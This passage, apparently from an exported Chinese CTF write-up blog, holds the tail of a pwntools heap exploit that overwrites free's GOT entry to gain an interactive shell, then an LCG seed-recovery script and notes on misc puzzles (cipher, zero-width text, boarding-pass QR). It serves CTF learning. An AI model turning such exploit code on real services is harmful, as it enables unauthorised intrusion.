</span></span><br><span class=\"line\">p=<span class=\"number\">0x23</span> * <span class=\"string\">b&#x27;e&#x27;</span> + p64(free_got)</span><br><span class=\"line\">create(<span class=\"number\">0x60</span>,p)  <span class=\"comment\"># idx4 </span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x8</span>,p64(<span class=\"number\">0x400C2C</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;Index :&quot;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"lcg\"><a class=\"anchor\" href=\"#lcg\">#</a> lcg</h3>\n<p>参考这个博客，可以直接出<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1cGVycHJpbnRmL2FydGljbGUvZGV0YWlscy8xMDg5NjQ1NjM=\"> https://blog.csdn.net/superprintf/article/details/108964563</span><br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gcd</span>(<span class=\"params\">a,b</span>): </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(b==<span class=\"number\">0</span>): </span><br><span class=\"line\">        <span class=\"keyword\">return</span> a </span><br><span class=\"line\">    <span class=\"keyword\">else</span>: </span><br><span class=\"line\">        <span class=\"keyword\">return</span> gcd(b,a%b) </span><br><span class=\"line\"></span><br><span class=\"line\">s = [<span class=\"number\">64053834035066785058511795263859088093402576718387054930069870694827422995248363210875296865931156540418540088656840163752864867889701529</span>, <span class=\"number\">62747878069691338351001678737533032651009187924993079609551517187402239263500990458468121965725468864035542647616568888614971291913860683</span>, <span class=\"number\">8610389166165547798963079074461089122942923569827711232062490735297527674581120584017030806864406444034839689358368567214353599295961192</span>, <span class=\"number\">67368398051089407366868405625671942347378755129423872678285919732014302509367453094142041707571135936337763803644340301362544880144675515</span>, <span class=\"number\">3140546334522640626644397935274312967014650101920766829848908314358452633165879115222769049730993718556007257838431843662986174886332684</span>, <span class=\"number\">86570894867827558107244361752089586436766881136739525172025909326268148819720261812567282066327259810017581923500053674785415315313293458</span>, <span class=\"number\">74270633946662538117925791534180331044438757906314082041974053142483165604719102121031974214138125154407150853174565679126633465007917723</span>, <span class=\"number\">82222345180880564316408536364709779418528442531150999715627704885024880160675971236916036110841803202987616501846568355385621016171784903</span>, <span class=\"number\">79833541796675422937999973936505826001046326324194169378072775519666431460490483847928549009565561011528302879850550395115321828798479473</span>, <span class=\"number\">70276250399219459795079058514491950109021040664671993784167534811426903455184545174600178849521746939676479421177456528336980088529680364</span>]</span><br><span class=\"line\">t = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>):</span><br><span class=\"line\">    t.append(s[i]-s[i-<span class=\"number\">1</span>]) </span><br><span class=\"line\">all_n = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    all_n.append(gcd((t[i+<span class=\"number\">1</span>]*t[i-<span class=\"number\">1</span>]-t[i]*t[i]), (t[i+<span class=\"number\">2</span>]*t[i]-t[i+<span class=\"number\">1</span>]*t[i+<span class=\"number\">1</span>]))) </span><br><span class=\"line\"></span><br><span class=\"line\">MMI = <span class=\"keyword\">lambda</span> A, n,s=<span class=\"number\">1</span>,t=<span class=\"number\">0</span>,N=<span class=\"number\">0</span>: (n &lt; <span class=\"number\">2</span> <span class=\"keyword\">and</span> t%N <span class=\"keyword\">or</span> MMI(n, A%n, t, s-A//n*t, N <span class=\"keyword\">or</span> n),-<span class=\"number\">1</span>)[n&lt;<span class=\"number\">1</span>] <span class=\"comment\">#逆元计算</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> all_n:</span><br><span class=\"line\">    n=<span class=\"built_in\">abs</span>(n)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> n==<span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span> (n)</span><br><span class=\"line\">    a=(s[<span class=\"number\">2</span>]-s[<span class=\"number\">1</span>])*MMI((s[<span class=\"number\">1</span>]-s[<span class=\"number\">0</span>]),n)%n</span><br><span class=\"line\">    a_phi=MMI(a,n)</span><br><span class=\"line\">    b=(s[<span class=\"number\">1</span>]-a*s[<span class=\"number\">0</span>])%n</span><br><span class=\"line\">    seed = (a_phi*(s[<span class=\"number\">0</span>]-b))%n</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(long_to_bytes(seed))</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"加密\"><a class=\"anchor\" href=\"#加密\">#</a> 加密？</h3>\n<p>跳舞的小人解出密码：SHERLOCK</p>\n<p>打开后看到一个空白的 txt 文件，查看内码，零宽解出：JKGASwqeeh!@$</p>\n<p>得到这个：63756D746374667B69745F69735F63727970746F3F7D</p>\n<p it_is_crypto?=\"\">base16 解密：cumtctf</p>\n<h3 id=\"社工\"><a class=\"anchor\" href=\"#社工\">#</a> 社工？</h3>\n<p>大意了，WANG/JIA 中间的斜杠还要保留</p>\n<p>去这里扫一下机票上的二维码：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZW1vLmR5bmFtc29mdC5jb20vYmFyY29kZS1yZWFkZXIv\">https://demo.dynamsoft.com/barcode-reader/</span></p>\n<p>得到信息：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435349/Typera/2023/04/6761b9a34806e510c91173b2704cebfa.png\" alt=\"image-20230425230905993\" /></p>\n<p>然后去搜一下飞机票二维码的数据信息</p>\n<p>M1 就是旅客姓名</p>\n<p WANGJIA=\"\">flag : cumtctf</p>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc",
                "Pwn"
            ]
        }
    ]
}